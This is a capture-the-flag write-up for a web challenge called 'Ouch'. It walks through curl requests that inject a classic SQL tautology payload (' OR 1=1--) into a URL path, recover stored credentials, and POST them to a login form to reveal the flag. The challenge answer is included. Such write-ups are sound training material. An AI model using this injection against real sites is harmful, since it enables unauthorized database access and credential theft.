# Ouch

**Challenge Category: Web** <br />
**Challenge Points: 500**

## Challenge Description

A link has once granted access to the user database through the path `/user/username123/p@ssw0rd123`, but it does not work for now.

`ouch.nypinfosec.com`

## Analysis

We know from the challenge description that there is an endpoint `/user/username123/p@ssw0rd123`.

### 1. Requesting Normally

When we send a HTTP request to the clued endpoint, we get an "Error" as the response.

```sh
$ curl -s "https://ouch.nypinfosec.com/user/username123/p@ssw0rd123"
```

```
Error
```

### 2. Testing SQL Injection

What happens if we try injecting malicious SQL code? Does it still return the same "Error" as response?

```sh
$ curl "https://ouch.nypinfosec.com/user/username123/p@ssw0rd123'%20OR%201=1--"
```

```
Username: 5ql, Password: INJeC7ioN
```

## Solution

1. We know the `username` and `password` login credentials.
2. We also know that the root of the website is accessible, hinted in the challenge description.

```sh
$ curl -s "https://ouch.nypinfosec.com"
```

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>NYP InfoSec CTF</title>
  </head>
  <body>
    <div class="login">
      <form action="/" method="post">
        <label for="username">
          <i class="fas fa-user"></i>
        </label>
        <input
          type="text"
          name="username"
          placeholder="Username"
          id="username"
          required
          hidden
        />
        <label for="password">
          <i class="fas fa-lock"></i>
        </label>
        <input
          type="password"
          name="password"
          placeholder="Password"
          id="password"
          required
          hidden
        />
        <div class="msg"></div>
        <input type="submit" value="Login" hidden />
      </form>
    </div>
  </body>
</html>
```

3. We notice 2 hidden input fields matching the login credentials we found earlier. Looking at the `<form>` element, we notice the `action="/"` and `method="post"` attributes, hinting that we can also send a `POST` request to this endpoint with the credentials we found earlier.

```sh
$ curl -s -X POST "https://ouch.nypinfosec.com" -d "username=5ql" -d "password=INJeC7ioN"
```

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Title</title>
  </head>
  <body>
    <p>The flag is NYP{oUcH_tH3_1nj3c71on_w@s_p@infu1}</p>
  </body>
</html>
```

4. Let's cleanup the output a little bit.

```sh
$ curl -s -X POST "https://ouch.nypinfosec.com" -d "username=5ql" -d "password=INJeC7ioN" | grep -o "NYP{.*}"
```

```
NYP{oUcH_tH3_1nj3c71on_w@s_p@infu1}
```
